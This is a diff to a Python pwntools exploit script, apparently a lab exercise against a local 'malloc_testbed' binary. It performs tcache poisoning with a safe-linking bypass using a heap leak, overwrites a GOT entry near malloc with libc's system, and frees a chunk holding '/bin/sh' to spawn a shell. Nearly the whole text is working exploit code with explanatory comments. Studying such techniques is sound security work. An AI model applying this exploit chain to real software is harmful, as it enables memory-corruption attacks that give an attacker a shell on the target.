@@ -34,6 +34,8 @@ def tcache_overflow(p):
     free(p, b'2')
     free(p, b'1') 
 
+    edit(p, b'2', b'/bin/sh') # prep for system call
+
     '''
     Before we do our overflow, we need a heap leak. This is due to another
     recent mitigation that 'encrypts' tcache entries. Thankfully this is
@@ -56,9 +58,9 @@ def tcache_overflow(p):
     heap_leak = decrypt_tcache(heap_leak)
 
     # Now we have our leak, we can use it to encrypt our target
-    write_got = 0x603030  # This is our target thanks to partial relro
+    malloc_got = 0x603010  # 8 bytes before malloc got, so we clobber pthread_exit :(
     # We chose the target above as the final nibble is 0 (another mitigation bypass)
-    encrypted_tgt = write_got ^ (heap_leak >> 12)  # Step 2 to mitigation bypass
+    encrypted_tgt = malloc_got ^ (heap_leak >> 12)  # Step 2 to mitigation bypass
 
     # Overwrite the fd ptr of first chunk in 0x20 tcache
     edit(p, b'0', p64(0)*3 + p64(0x21) + p64(encrypted_tgt))
@@ -66,16 +68,10 @@ def tcache_overflow(p):
     malloc(p, b'0x18')
     malloc(p, b'0x18')  # Now we have access to the target like it's a typical chunk
 
-    one_gadget = libc.address + 0xf1a96
-    '''
-    Constraints:
-    [rsp+0x70] == NULL
-    [[rsp+0x170]] == NULL || [rsp+0x170] == NULL
-    [rsp+0x30] == NULL || (s32)[rsp+0x30]+0x4 <= 0 
-    '''
+    system = libc.address + 0x487c0
    
-    edit(p, b'4', p64(one_gadget))
-    read_chunk(p, b'0')
+    edit(p, b'4', b'A'*8 + p64(system))
+    free(p, b'2')
 
 
 # Running exploit in debugger in case you are on kernel >= 6.4... CET is an issue.
@@ -84,9 +80,9 @@ def tcache_overflow(p):
 #''')
 
 p = process('./malloc_testbed')
-gdb.attach(p, '''
-c         
-''')
+#gdb.attach(p, '''
+#c         
+#''')
 
 tcache_overflow(p)
 
